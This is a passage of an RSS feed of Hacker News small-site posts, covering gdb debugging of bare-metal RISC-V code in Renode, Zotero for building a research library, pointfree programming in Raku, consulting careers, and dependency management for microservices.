<p>There are a couple simple commands that I find to be useful when exploring baremetal programming.</p>
<div id="step-a-single-instruction">
<h4>Step a single instruction</h4>
<p>Type <tt>S</tt> <tt>I</tt> <tt>Enter</tt></p>

<p>To repeat the last command, just repeatedly hit <tt>Enter</tt>. This makes it easy to single step through the program.</p>
<p>You will notice that you get stuck in the delay loop, you would have to hit <tt>Enter</tt> 9,000,000 times to make it though that delay. This is not a good way to add delays since it uses 100% of the CPU. If we were building an operating system, we could utilize a hardware timer and allow programs to request sleeps through an API. During the sleep the OS could go about running other processes, and then wake up the sleeping process at the appropriate time.</p>
</div>
<div id="continue-normal-execution">
<h4>Continue normal execution</h4>

</div>
<div id="break-normal-execution">
<h4>Break normal execution</h4>
<p>Send a keyboard interrupt, e.g. <tt>CTRL</tt> + <tt>C</tt></p>
<div><pre><span></span>(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
delay_loop () at baremetal.s:13
(gdb) █
</pre></div>
</div>
<div id="set-a-breakpoint">
<h4>Set a breakpoint</h4>
<p>You can set a breakpoint at a line or symbol. Tab completion should work here to display available symbols. So <tt>B</tt> <tt>Space</tt> <tt>T</tt> <tt>Tab</tt> <tt>Enter</tt></p>
<div><pre><span></span>(gdb) b toggle_led
Breakpoint 1 at 0x10074: file baremetal.s, line 16.
(gdb) c
Continuing.

Breakpoint 1, toggle_led () at baremetal.s:16
(gdb) █
</pre></div>
</div>
<div id="read-registers">
<h4>Read Registers</h4>
<p>You can dump all registers,</p>
<div><pre><span></span>(gdb) info registers
    ra             0x0      0x0
    fp             0x0      0x0
    s1             0x0      0
    a0             0x24648f 2385039
    ...
    t4             0x0      0
    t5             0x0      0
    t6             0x0      0
    pc             0x1006c  0x1006c &lt;delay_loop&gt;
</pre></div>
<p>or you can print a specific one:</p>
<div><pre><span></span>(gdb) p $pc
$5 = (void (*)()) 0x10074 &lt;toggle_led&gt;
(gdb) p $a4
$6 = 2
</pre></div>
</div>
<div id="setting-a-register">
<h4>Setting a register</h4>
<p>You can mutate a register value and continue on:</p>
<div><pre><span></span>(gdb) set $pc=delay_loop
(gdb) c
Continuing.
</pre></div>
</div>
</div>
</div>
<div id="changing-the-bitmask-for-blinky">
<h2><a href="#id21">Changing the bitmask for blinky</a></h2>
<p>Let's do something fun and prove we can modify a program's state after breaking.</p>
<p>If we just run the blinky example, note that we are blinking <tt>led0</tt>:</p>
<div><pre><span></span>15:09:23.7671 [NOISY] gpio_out.led0: LED state changed to True
15:09:24.0805 [NOISY] gpio_out.led0: LED state changed to False
15:09:24.3872 [NOISY] gpio_out.led0: LED state changed to True
15:09:24.7525 [NOISY] gpio_out.led0: LED state changed to False
</pre></div>
<p>Change the bitmask:</p>
<div><pre><span></span>(gdb) set $a6=0b10
(gdb) c
Continuing.
</pre></div>
<p>Now we are blinking <tt>led1</tt> instead of <tt>led0</tt>:</p>
<div><pre><span></span>15:09:42.5007 [NOISY] gpio_out.led1: LED state changed to True
15:09:42.7653 [NOISY] gpio_out.led1: LED state changed to False
15:09:43.0602 [NOISY] gpio_out.led1: LED state changed to True
15:09:43.3263 [NOISY] gpio_out.led1: LED state changed to False
</pre></div>
</div>

<div id="next-post">
<h2><a href="#id23">Next post</a></h2>
<p>In the next post, I'll talk about alternate dev environments and how I converged on what I've described here. There are many easier and more <em>complete/integrated</em> solutions, but we have a stated goal of gaining understanding and this is a forcing function for more control over details.</p>
</div>


    </div>

    
    </div></div>]]>
            </description>
            <link>https://blog.y2kbugger.com/baremetal-riscv-renode-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509538</guid>
            <pubDate>Tue, 22 Dec 2020 18:34:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Personal Research Library]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509477">thread link</a>) | @iamacyborg
<br/>
December 22, 2020 | https://www.jacquescorbytuech.com/writing/building-personal-research-library | <a href="https://web.archive.org/web/*/https://www.jacquescorbytuech.com/writing/building-personal-research-library">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content">
<article>
<header>

</header>
<p><small><time datetime="2020-12-22T13:56:00+00:00">
      Tue 22 December 2020
    </time></small>
</p>
<div>
<p>In an excellent post by Steph Smith, titled <a href="https://blog.stephsmith.io/learning-to-write-with-confidence/">Writing is Thinking: Learning to Write with Confidence</a>, she describes what she calls the Thinking and Writing Cycle as follows:</p>
<blockquote>
<p>Writing and thinking are two peas in a powerful pod. Critical thinking leads to good writing, which leads to clearer thinking, and so on. By improving your writing, you are also improving your ability to think and vice versa.</p>
</blockquote>
<p>Earlier this year <a href="https://www.jacquescorbytuech.com/writing/zettlr-notes-zettlekasten">I started using a note taking app</a> called <a href="https://www.zettlr.com/">Zettlr</a> to write notes for all manner of things. I use it to take down notes for projects I'm working on, software I'm using, books I'm reading, articles I've read online and lots more. I also, as you can guess, have started using it to improve what I suppose can be called my capacity for critical thinking. It's been great.</p>
<p>Going hand-in-hand with writing is reading, and just like Zettlr, I've found a great open source tool that I use to keep track of what I've read<sup id="fnref:1"><a href="#fn:1">1</a></sup>, when. That tool is <a href="https://www.zotero.org/">Zotero</a>.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Zotero.png"><img alt="Zotero" src="https://d33wubrfki0l68.cloudfront.net/b37efccfb0e27779a6b7e876d8c7b0cf336b472f/81f61/images/post-images/zotero.png"></a></p>
<p>Zotero lets you build a personal library of books, articles, web pages, PDF's and more with just a few clicks, and can be synced with an online account for access across multiple devices (including of any PDF you might have chosen to upload).</p>
<p>You can use <a href="https://en.wikipedia.org/wiki/Digital_object_identifier">DOI links</a> to import an article into your library with tons of useful metadata such as access dates, authors, etc.</p>
<p>There's also a useful Chrome browser extension that lets you easily bookmark web pages for future referencing.</p>
<p>There are a whole host of features for academic writing, but those are less useful for me. If you do need to keep track of a bibliography for referencing purposes though Zotero is perfect, and <a href="https://docs.zettlr.com/en/academic/citations/">works incredibly well with Zettlr</a>.</p>
<p>With many of us needing to continue to work from home, and with employers adapting to environments in which large numbers of staff may well continue to work from home, high quality asynchronous communication becomes the de-facto gold standard.</p>
<p>We all need to spend time improving the quality of our non-verbal communication. In that scenario, taking up a writing habit can only be a good thing, and building a personal research library has to be encouraged to provoke the Thinking and Writing Cycle.</p>
<p>If you're a marketer like me, I would highly recommend spending some time getting comfortable with an RSS reader like Feedly and subscribing <a href="https://statmodeling.stat.columbia.edu/">to</a> <a href="https://cxl.com/blog">great</a> <a href="https://wordtothewise.com/blog">websites</a>. I also highly recommend keeping tabs on the following journals.</p>
<ul>
<li><a href="https://journals.sagepub.com/loi/mrja?ai=2b4&amp;mi=ehikzz&amp;af=R">Journal of Marketing Research</a></li>
<li><a href="https://www.sciencedirect.com/journal/journal-of-interactive-marketing">Journal of Interactive Marketing</a></li>
<li><a href="https://www.sciencedirect.com/journal/international-journal-of-research-in-marketing">International Journal of Research in Marketing</a></li>
<li><a href="https://www.springer.com/journal/11747">Journal of the Academy of Marketing Science</a></li>
<li><a href="https://www.springer.com/journal/11129">Quantitative Marketing and Economics</a></li>
</ul>
<p>Building a reading habit is one of the best things to do, for your career and for your own personal development. </p>
<p>Read more. Document what you write. Write about it.</p>

<p>Cheers,</p>
<p><img src="https://www.jacquescorbytuech.com/images/jacques.png">
</p></div>
<div>
<h4>Subscribe for updates</h4>

<p>Updates, whenever I've got something valuable to say.</p>
</div>
</article>
</section></div>]]>
            </description>
            <link>https://www.jacquescorbytuech.com/writing/building-personal-research-library</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509477</guid>
            <pubDate>Tue, 22 Dec 2020 18:29:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What’s the Point of Pointfree Programming?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25509468">thread link</a>) | @codesections
<br/>
December 22, 2020 | https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/ | <a href="https://web.archive.org/web/*/https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-963">

	

	
	<div>
		<blockquote><p>He had taken a new name for most of the usual reasons, and for a few unusual ones as well, not the least of which was the fact that names were important to him.</p></blockquote>
<p>— Patrick Rothfuss, <em>The Name of the Wind</em></p>
<p>If you’re a programmer, there’s a good chance that names are important to you, too.  Giving variables and functions well chosen names is one of the <a href="https://dzone.com/articles/naming-conventions-from-uncle-bobs-clean-code-phil" rel="nofollow">basic tenets of writing good code</a>, and improving the quality of names is one of the first steps in <a href="https://thoughtbot.com/upcase/videos/refactoring-extraction-naming" rel="nofollow">refactoring low-quality code</a>.  And if you both are a programmer and are at all familiar with Raku (renamed from “Perl 6” in 2019), then you are even more likely to appreciate the power and importance of names.</p>
<p>This makes the appeal of <a href="http://xahlee.info/comp/point-free_programing.html" rel="nofollow">pointfree programming</a> – which advocates for removing many of the names in your code – a bit mysterious.  Given how helpful good names are, it can be hard to understand why you’d want to eliminate them.</p>
<p>This isn’t necessarily helped by some of the arguments put forward by advocates of pointfree programming (which is also sometimes called <em>tacit programming</em>).  For example, one proponent of pointfree programming <a href="https://spin.atomicobject.com/2017/09/29/point-free-notation/#.Wc5PtNDfhoc.hackernews" rel="nofollow">said</a>:</p>
<blockquote><p>Sometimes, especially in abstract situations involving higher-order functions, providing names for tangential arguments can cloud the mathematical concepts underlying what you’re doing.  In these cases, point-free notation can help remove those distractions from your code.</p></blockquote>
<p>That’s not <em>wrong</em>, but it’s also not exactly helpful; when reading that, I find myself thinking “<em>sometimes</em>; OK, when?  <em>in abstract situations</em>; OK, what sort of situations?”  And it seems like I’m not the only one with a similar set of questions, as the <a href="https://news.ycombinator.com/item?id=15365214" rel="nofollow">top Hacker News comment</a> shows.  Given arguments like these, I’m not at all surprised that many programmers dismiss pointfree programming in essentially the same way <a href="https://en.wikipedia.org/wiki/Tacit_programming" rel="nofollow">Wikipedia does</a>: according to Wikipedia, pointfree programming is “of theoretical interest” but can make code “unnecessarily obscure”.</p>
<p>This view – though understandable – is both mistaken and, I believe, deeply unfortunate.  Programming in a pointfree style can make code <em>far</em> more readable; done correctly, it makes code less obscure rather than more.  In the remainder of this post I’ll explain, as concretely as possible, the advantage of coding with fewer names.  To keep myself honest, I’ll also refactor a short program into pointfree style (the code will be in Raku, but both the before and after versions should be approachable to non-Raku programmers).  Finally, I’ll close by noting a handful of the ways that Raku’s “there’s more than one way to do it” philosophy makes it easier to write clear, concise, pointfree code (if you want to).</p>
<h2>The fundamental point of pointfree</h2>
<p>I said before that names are important, and I meant it.  My claim is the one that <a href="https://slatestarcodex.com/2014/12/25/book-review-whats-wrong-with-the-world/" rel="nofollow">G.K. Chesterton (or his dog) might have made</a> if only he’d cared about writing good code: we should use fewer names not because names are unimportant but precisely <em>because</em> of how important names are.</p>
<p>Let’s back up for just a minute.  Why do names help with writing clear code in the first place?  Well, most basically, because good names convey information.  <code>sub f($a, $b)</code> may show you that you’ve got a function that takes two arguments – but it leaves you totally in the dark about what the function does or what role the arguments play.  But everything is much clearer as soon as we add names: <code>sub days-to-birthday($person, $starting-date)</code>.  Suddenly, we have a much better idea what the function is doing.  Not a perfect idea, of course; in particular, we likely have a number of questions of the sort that would be answered by adding types to the code (something <a href="https://raku.guide/#_types" rel="nofollow">Raku supports</a>).  But it’s undeniable that the names added information to our code.</p>
<p>So if adding names adds info, it’ll make your code clearer and easier to understand, right?  Well, sure … up to a point.  But this is the same line of thinking that leads to pages and pages of loan “disclosures”, each of which is designed to give you more information about the loan.  Despite these intentions, anyone who has confronted a stack of paperwork the approximate size of the Eiffel Tower can attest that the cumulative effect of this extra info is to <a href="https://www.law.upenn.edu/journals/lawreview/articles/volume159/issue3/BenShaharSchneider159U.Pa.L.Rev.647(2011).pdf" rel="nofollow">confuse readers and obscure the important details</a>.  Excessive names in code can fall into the same trap: even if each name technically adds info, the cumulative effect of too many names is confusion rather than clarity.</p>
<p>Here’s the same idea in different words: what names add to your code is not just extra <em>info</em> but also extra <em>emphasis</em>.  And the thing about emphasis – whether it comes from bold, all-caps, or naming – is that it loses its power when overused.  Giving everything a name is the same sort of error as writing in ALL-CAPS.  Basically, don’t be this guy:</p>
<pre><code>&lt;Khassaki&gt;:      HI EVERYBODY!!!!!!!!!!  
&lt;Judge-Mental&gt;:  try pressing the Caps Lock key  
&lt;Khassaki&gt;:      O THANKS!!! ITS SO MUCH EASIER TO WRITE NOW!!!!!!!  
&lt;Judge-Mental&gt;:  f**k me  
</code></pre>
<p><a href="http://bash.org/?835030" rel="nofollow">source</a> (expurgation added, mostly to have an excuse to use the word <a href="https://www.merriam-webster.com/dictionary/expurgate" rel="nofollow">expurgation</a>).</p>
<p>I believe that the fundamental benefit of using pointfree programming techniques to write code with fewer names is that it allows the remaining names to stand out more – which lets them convey <strong>more</strong> information than a sea of names would do.</p>
<h2>What does it mean to “understand” a line of code?</h2>
<p>Do you understand this line of Raku code?</p>

<p>Let’s imagine how a very literal programmer – we’ll call them Literal Larry – might respond.  (Literal Larry is, of course, not intended to refer to Raku founder <a href="https://en.wikipedia.org/wiki/Larry_Wall" rel="nofollow">Larry Wall</a>.  That Larry may have been accused of various stylistic flaws over the years, but <em>never</em> of excessive literalness.)</p>
<p>Literal Larry might say, “Of course I understand what that line does!  There’s a <code>$fuel</code> variable, and it’s incremented by the value of the <code>$mass</code> variable.  Could it be any more obvious?”.  But my response to Larry (convenient strawman that he is) would be, “You just told me what that line <em>says</em>, but not what it <em>does</em>.  Without knowing more of the context around that line, in fact, we can’t know what that line does.  Understanding that single – and admittedly simple! – line requires that we hold the context of other lines in our head.  Worse, because it’s changing the value of one variable based on the value of another, understanding it requires us to track <em>mutable state</em> – one of the fastest ways to add complexity to a piece of code.”</p>
<p>And that sets up my second claim about coding in a pointfree style: It often reduces the amount of context/state that you need in your head to understand any given line of code.  Pointfree code reduces the reliance on context/state in two ways: first, to the extent that we totally eliminate some named variables, then we obviously no longer need to mentally track the state of those variables.  Less obviously (but arguably more importantly), a pointfree style naturally pushes you towards limiting the scope of your variables and reduces the number to keep track of at any one time.  (You’ll see this in action as we work through the example below.)</p>
<h2>A pointed example</h2>
<p>Despite keeping our discussion as practical as possible, I worry that it has drifted a bit away from the realm of the concrete.  Let’s remedy that by writing some actual code!  I’ll present some code in a standard procedural style, refactor it into a more pointfree style, and discuss what we get out of the change.</p>
<p>But where should we get our <em>before</em> code?  It needs to be decently written – my exchange with Literal Larry was probably enough strawmanning for one post, and I don’t want you to think that the refactored version is only an improvement because the original was awful.  At the same time, it shouldn’t be <em>great</em> idiomatic Raku code, because that would mean using enough of Raku’s superpowers to reduce the code’s accessibility (I want to explain what’s going on in the <em>after</em> code, but don’t want to get bogged down teaching the <em>before</em>).  It should also be just the right length – too short, and we won’t be able to see the advantages of reducing context; too long, and we won’t have space to walk through it in any detail.</p>
<p>Fortunately, the Raku docs provide the perfect <em>before</em> code: the <a href="https://docs.raku.org/language/101-basics" rel="nofollow">Raku by example 101</a> code.  This simple script is <em>not</em> idiomatic Raku; it’s a program that does real (though minimal) work while using only the very basics of Raku syntax.  Here’s how that page describes the script’s task:</p>
<blockquote><p>Suppose that you host a table tennis tournament. The referees tell you the results of each game in the format Player1 Player2 | 3:2, which means that Player1 won against Player2 by 3 to 2 sets. You need a script that sums up how many matches and sets each player has won to determine the overall winner.</p>
<p>The input data (stored in a file called scores.txt) looks like this:</p>
<blockquote><p>Beth Ana Charlie Dave<br>
Ana Dave | 3:0<br>
Charlie Beth | 3:1<br>
Ana Beth | 2:3<br>
Dave Charlie | 3:0<br>
Ana Charlie | 3:1<br>
Beth Dave | 0:3</p></blockquote>
<p>The first line is the list of players. Every subsequent line records a result of a match.</p></blockquote>
<p>I believe that the code should be legible, even to programmers who have not seen any Raku.  The one hint I’ll provide for those who truly haven’t looked at Raku (or Perl) is that <code>@</code> indicates that a variable is array-like, <code>%</code> indicates that it’s hashmap-like, and <code>$</code> is for all other variables.  If any of the other syntax gives you trouble, check out the <a href="https://docs.raku.org/language/101-basics" rel="nofollow">full walkthrough in the docs</a>.</p>
<p>Here’s the 101 version:</p>
<div>
<pre><span>use</span> v6d;
<span><span>#</span> start by printing out the header.</span>
<span>say</span> <span><span>"</span>Tournament Results:<span>\n</span><span>"</span></span>;

<span>my</span> $file  <span>=</span> <span>open</span> <span><span>'</span>scores.txt<span>'</span></span>; <span><span>#</span> get filehandle and...</span>
<span>my</span> @names <span>=</span> $file<span>.</span><span>get</span><span>.</span><span>words</span>;   <span><span>#</span> ... get players.</span>

<span>my</span> <span>%</span>matches;
<span>my</span> <span>%</span>sets;

<span>for</span> $file<span>.</span><span>lines</span> <span>-&gt;</span> $line {
    <span>next</span> <span>unless</span> $line; <span><span>#</span> ignore any empty lines</span>

    <span>my</span> ($pairing, $result) <span>=</span> $line<span>.</span><span>split</span>(<span><span>'</span> | <span>'</span></span>);
    <span>my</span> ($p1, $p2)          <span>=</span> $pairing<span>.</span><span>words</span>;
    <span>my</span> ($r1, $r2)          <span>=</span> $result<span>.</span><span>split</span>(<span><span>'</span>:<span>'</span></span>);

    <span>%</span>sets{$p1} <span>+=</span> $r1;
    <span>%</span>sets{$p2} <span>+=</span> $r2;

    <span>if</span> $r1 <span>&gt;</span> $r2 {
        <span>%</span>matches{$p1}<span>++</span>;
    } <span>else</span> {
        <span>%</span>matches{$p2}<span>++</span>;
    }
}

<span>my</span> @sorted <span>=</span> @names<span>.</span><span>sort</span>({ <span>%</span>sets{<span>$_</span>} })<span>.</span><span>sort</span>({ <span>%</span>matches{<span>$_</span>} })<span>.</span><span>revers…</span></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/">https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/</a></em></p>]]>
            </description>
            <link>https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509468</guid>
            <pubDate>Tue, 22 Dec 2020 18:28:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hack Your Career with Consulting]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509340">thread link</a>) | @softwaredoug
<br/>
December 22, 2020 | https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html | <a href="https://web.archive.org/web/*/https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p>Want a career full of adventure and tough technical challenges? Excited to see the world? Build a personal brand? Want to grow your ability to create trusting relationships? Consulting may be for you!</p>

<p>I want to reflect on my almost 8 years as a specialized software consultant. I worked in the search relevance space (creating smarter search engines) at <a href="http://opensourceconnections.com/">OpenSource Connections</a>, which gave me exposure to an invaluable mix of technical and soft skills. Maybe this article will inspire why (and why not) you would want to take on a consulting role.</p>



<p>Consulting initially appealed to me because I enjoyed being thrown in the deep end. My normal work assignments were too easy. In my pre-consulting job, I’d feel bored 2-3 months for every 1 month of really intense challenging work. At the time, in my early 30s, I wanted that intensity all the time.</p>

<p>I had that opportunity and then some! At OpenSource Connections I quickly became the go-to person when the client realized “these search results make no sense!”. I learned to optimize the relevance ranking of search applications, which in the early 2010s, was not something you obsessed about unless you were Amazon or Google. Lucky for me, I was in the right place at the right time to go after this niche and build a personal brand.</p>

<p>However, I soon found that there’s another side to being in this ‘deep end’.</p>

<p>I found myself on the first day of the job apologizing for a former colleague’s shoddy code. I was asked pointedly by the client’s frustrated CTO whether this was typical of our projects and how we could possibly plan to move forward from this point. Another early client was upset with why a question-answering application wasn’t returning the magical results they expected. We had to come with not just a technical plan: but one to clearly communicate concrete expectations on both sides.</p>

<p>These events required me to develop skills I didn’t know I needed - the ability to genuinely build trust and grow my relationship with clients. To see a low point as an opportunity to find a path forward to a better relationship. All in the context to do exciting technical feats to solve their problems.</p>

<p>Shortly after joining OpenSource Connections, my answer to <strong>why consulting?</strong> became:</p>

<ol>
  <li><strong>Nichy</strong> - Here’s a really cool niche I can define, explore, learn about!</li>
  <li><strong>Technical</strong> - The technical work is hard and touches on technical areas I care about (intersection of data science and engineering, fuzzy hard to define use cases, intersection of human psychology and technology)</li>
  <li><strong>Relationships &amp; service</strong> - I genuinely valued the hard-won relationships that came out of difficult conversations. These low points were always opportunities to demonstrate I truly cared about a value of service to the client</li>
</ol>



<p>John Berryman is fond of calling consulting a “gateway to entrepreneurship”. I think this is right, because frankly you act as a mini-entrepreneur as a consultant. You’re a sought-after domain expert that also must develop much needed marketing, sales, and client relationship skills. You care about your niche, and the marketability of your skills all the time.</p>

<p>You learn the only difference between a marketing prospect, a sales lead, and client is only the amount of resources you can devote to them. What does this mean? They all deserve an attitude of service and respect. You build a good relationship and help all of them - person reading your blog, sales inquiry, and paying client - think through tough problems through your work. <strong>You are genuine and earnest about serving people, whether they pony up money for your service!</strong></p>

<p>The genuine relationship starts with marketing: before you even talk to them. You demonstrate an attitude towards service in how you engage the market. You write non-spammy, deep, honest blog posts about your field. You give transparent, clear technical talks that barely mentions you provide a service. You do this because you genuinely want to help people. It demonstrates your trustworthiness, which only encourages prospective clients to reach out to you as an advisor in the field.</p>

<p>The relationship continues when you’re contacted by a lead. Sales prospects reach out to you with your first opportunity to assist them. The sales conversation is like the first ‘assignment’ from them by seeking your advice on a tough decision. Almost always the sales prospect is asking themselves some variant of “how do I proceed on this tough challenge at my job for which you are the expert?”.</p>

<p>You <em>must</em> give the sales prospect your best, and really focus on service for them - same as any client. This could mean recommending a competitor as a better option. It also means possibly investing time and effort, perhaps creating a demo of some possible solution that might help them decide. If there seems to be good trust building, maybe we should fly out to help them in a tricky time? If they regret the call with you in 6 months, something has gone wrong!</p>

<p>Many of the same activities in marketing &amp; sales would be exactly the same activities we would do for a client. In every situation we scale our own personal investment to the trust and resources both sides are placing into the relationship. Almost all of the work is genuinely building a human relationship, letting them know we care, we want to help them, and here’s how. Sometimes, too, that means things naturally don’t work out, and that’s also OK. If this happens constantly, it’s a natural market signal we need to retool our niche and focus.</p>

<p>Eventually, you hope, a client signs a contract. Here, you run the risk of taking them for granted. Think of the situation I described earlier where I had to apologize to the CTO for shoddy work by my predecessor. The ‘apology’ I was engaging in – which included a ‘if we don’t shape up, you shouldn’t use us’ statement on my part – is not dissimilar from the kind of difficult ‘decision point’ a sales lead is at. Both require demonstrating our sincerity, showing the possible value we can/cannot have, and helping the client with their own decision making process.</p>

<p>If we’re not “continuing the sale” (in other words, really “valuing the relationship”) we’re dooming it. Like in personal life, both sides need to see what they’re getting, and it goes beyond just the delivery of working code to “can I count on this person in a pinch?” and “does this person genuinely care about me / my success?”</p>

<p>This focus on the relationship - where both sides invest trust and resources - is the key thing. Of course, a sales lead that drags us along and doesn’t invest anything on their end, shouldn’t be continued with. Same with a client that doesn’t pay a fair market value. They’re either just unable to invest the require resources or could just be taking advantage of us. However, when both sides (whether sales lead or client), show good faith and invest, you learn that consulting can be a virtuous cycle of trust, goodwill, and service. Your good clients will keep bringing you back. This is a great feeling!</p>



<p>Another colleague of mine, Spencer Ingram, has described treating your career as a startup. And the full cycle I talk about above - from investing and advertising in marketable skills, to helping prospects decide whether your skills can help them, to ultimately helping clients - is a great feedback loop for your career. It’s like you’re constantly learning and interviewing for jobs. And when things <em>dont</em> work out at the “interview” you still are growing your network in your industry constantly.</p>

<p>This is one of the most compelling reason to go into consulting. You are constantly examining where your field is going and repositioning - all the while growing your network.</p>

<p>This happened to me all the time. Constantly I received signals from clients on areas of focus I should grow in my field. This led to many of my decisions, like creating the Elasticsearch Learning to Rank plugin. Learning to Rank is/was a hot topic, and Elasticsearch badly needed the functionality. The information I got from clients was this was a major need: so I made sure it was marketing land I was grabbing for OpenSource Connections. I knew our skills and capabilities needed to grow in this direction, and in so doing, we could address marketing/sales/client questions that kept cropping up.</p>



<p>Consulting is great. However, there’s always a rub. And as the years wore on, I found myself increasingly less excited by some of the rougher aspects of high-end technical consulting, ultimately making a switch to a different role:</p>

<h2 id="feast-or-famine-sales-cycles">Feast-or-famine sales cycles:</h2>

<p>You have to gird yourself for a feast and famine reality. So you can tend to overdo it to make sure you have enough hour to bill. This means you can burn yourself out, trying to do what I just described in the sections above: trying to show too many clients you do truly care. You can easily overextend yourself worried that in 4 weeks you have no billable time. Then have it turn out you’ve oversold your time to clients. It can be hard to know when to take a vacation in this situation!</p>

<h2 id="rejection-during-sales">Rejection during sales:</h2>

<p>There’s an emotional roller-coaster ride to first the excitement of the original call “BigName client has X hard problem” to the let down later on of “it turns out they found another vendor” or “we can’t work with these people cause of onerous contract language, and their lawyers won’t bend”. This feeds the feast-or-famine thinking. It’s also just a let-down: you were really excited about that problem! It seemed you and the client clicked! What went wrong? Often it’s things out of our control.</p>

<h2 id="becoming-too-attached-to-a-solution-or-vision">Becoming TOO attached to a solution or vision</h2>

<p>One of the hardest things in consulting is that we’re really tourists. Our role isn’t <em>really</em> to deliver working code, per-se, in the same way as a normal, day-to-day technical. Often instead, our role is to help clients make decisions and educate them. It’s human to develop an attachment to one solution, vision, mindset, and to see it as TheWayForward:™: only to have politics, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html">https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html</a></em></p>]]>
            </description>
            <link>https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509340</guid>
            <pubDate>Tue, 22 Dec 2020 18:18:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why distributed apps need dependency management]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509223">thread link</a>) | @mooreds
<br/>
December 22, 2020 | https://www.architect.io/blog/why-distributed-apps-need-dependency-management | <a href="https://web.archive.org/web/*/https://www.architect.io/blog/why-distributed-apps-need-dependency-management">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://www.architect.io/images/blog/why-distributed-apps-need-dependency-management/dependency-mgmt@2x.png" alt="Dependency management"></p>
<p>Distributed cloud applications (aka microservices) have introduced an enormous
amount of complexity into the design and operation of cloud software. What used
to manifest itself as complexity hidden within a single process or runtime now
finds itself spread across tens or hundreds of loosely coupled services. While
all of these services can use different languages and can scale independently
from one another, the distributed nature can often make the app as a whole hard
to navigate, hard to deploy, and hard secure.</p>
<p>This new complexity makes it increasingly difficult to manage and contribute to
cloud-native applications, and beckons questions as to how we can maintain
healthy cloud software. How can we take advantage of the benefits of
service-oriented design without introducing friction and cost elsewhere?</p>
<p>Fortunately we've run into this problem before. Microservices aren't the first
pattern that has forced developers to figure out how to collaborate and
contribute to endless webs of interconnected components. For the last few
decades the solution has been the same: <strong>dependency management</strong>.</p>
<p>We use dependency managers every day to re-use public and private software
packages, build upon the work of others, and gracefully encapulate the details
of our own work into consumable formats. There are a number of reasons why
dependency management is the key to unlocking the power of distributed software,
and it's high time we learn from the past to power the future of cloud-native
development.</p>
<h2 id="1-developer-collaboration"><a href="#1-developer-collaboration" aria-label="1 developer collaboration permalink"></a>1. Developer collaboration</h2>
<p>One of the most important functions of dependency managers like
<a href="https://www.npmjs.com/">NPM</a>, <a href="https://pip.pypa.io/">Pip</a>,
<a href="https://maven.apache.org/what-is-maven.html">Maven</a>, and others, is to broker
collaboration amongst developers. By providing a consistent packaging mechanic
that seamlessly enables code to be extended, dependency managers have enabled
otherwise unrelated teams to consume each other's work. While these tools can be
used within the walls of enterprises to enable teams to publish and collaborate
on their work, we've seen dependency managers used at a much grander scale to
broker collaboration within the open-source community. The consistency of the
tooling and width of adoption has enabled the creation of enormously powerful
and freely accessible libraries for all to use and continue to build upon.</p>
<p>While this level of collaboration has been realized within the communities for
individual languages (NPM for Javascript, Pip for Python, etc.), it has yet to
be fully realized within the cloud-native community. We fortunately have Docker
to create consistency in how cloud services are packaged, but containers don't
have enough information about the relationships between services to resolve and
extend dependencies. Adding proper dependency management to index and resolve
relationships to peer apps and services is critical if we want to realize for
microservices what others already do with libraries in individual languages.</p>
<h2 id="2-self-service-environments"><a href="#2-self-service-environments" aria-label="2 self service environments permalink"></a>2. Self-service environments</h2>
<p>The collaborative effects of dependency managers don't happen by magic. The main
reason consistent dependency resolvers are so powerful is because developers all
around the world are able to reproduce their effects using the same commands and
processes. Reproducibility is a key element of dependency managers. Without it,
no one would be able to download and operate libraries and packages created by
others without complex, custom bootstrapping logic – the creation of which would
be an enormous barrier to adoption and distribution.</p>
<p>Service-oriented applications are no different from language-specific libraries
in this regard. Our ability to extend the work of others is predicated on our
ability to run or otherwise access the services and applications we hope to make
calls to. Teams have been able to make due by operating centralized QA or
sandbox environments, but the inability to reproduce these environments creates
a new set of problems. Engineers can't operate their own development
environments, services that depend on others can't be easily shipped, developers
are forced to write their own scripts to run their app locally and remotely, and
every team needs to about production-grade tools, networking, and network
security. By leveraging a consistent, dependency management solution, teams need
only to assert the network dependencies for their services to give everyone in
the org a consistent way to spin up services in their stack along with its
dependencies – allowing everyone to operate their own environments.</p>
<h2 id="3-automation"><a href="#3-automation" aria-label="3 automation permalink"></a>3. Automation</h2>
<p>The self-service benefits of consistent dependency management doesn't just mean
that developers can operate their own environments. It also means that
environments can be provisioned and torn down through automation. The
consistency of a single command or process to resolve dependencies, enrich
